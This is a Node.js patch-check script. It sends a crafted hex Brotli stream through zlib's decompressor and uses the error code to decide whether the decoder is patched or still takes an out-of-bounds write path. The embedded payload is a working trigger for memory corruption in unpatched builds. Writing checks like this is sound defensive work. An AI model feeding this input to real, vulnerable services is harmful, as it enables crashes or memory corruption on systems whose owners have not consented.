const zlib = require("zlib");
const payload = Buffer.from("200010414141fcffff07002228f00b60f7f41f000000", "hex");
let verdict = 2; // inconclusive
try {
  const out = zlib.brotliDecompressSync(payload);
  console.log("ERROR: decompressed without exception?!", out.length);
} catch (e) {
  console.log("err code:", e.code, "| errno:", e.errno);
  if (e.errno === -17) {
    console.log("PATCHED (rejects early, BLOCK_SWITCH)");
    verdict = 0;
  } else if (e.errno === -9) {
    console.log("UNPATCHED (BLOCK_LENGTH_1 — OOB write path taken)");
    verdict = 1;
  } else {
    console.log("other:", e.code);
  }
}
const probe = zlib.constants.BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH;
console.log("probe constant:", probe || "missing");
if (probe === -17 && verdict === 2) verdict = 0; // constant present = fix in build
if (!probe && verdict === 2) verdict = 3;
process.exit(verdict);
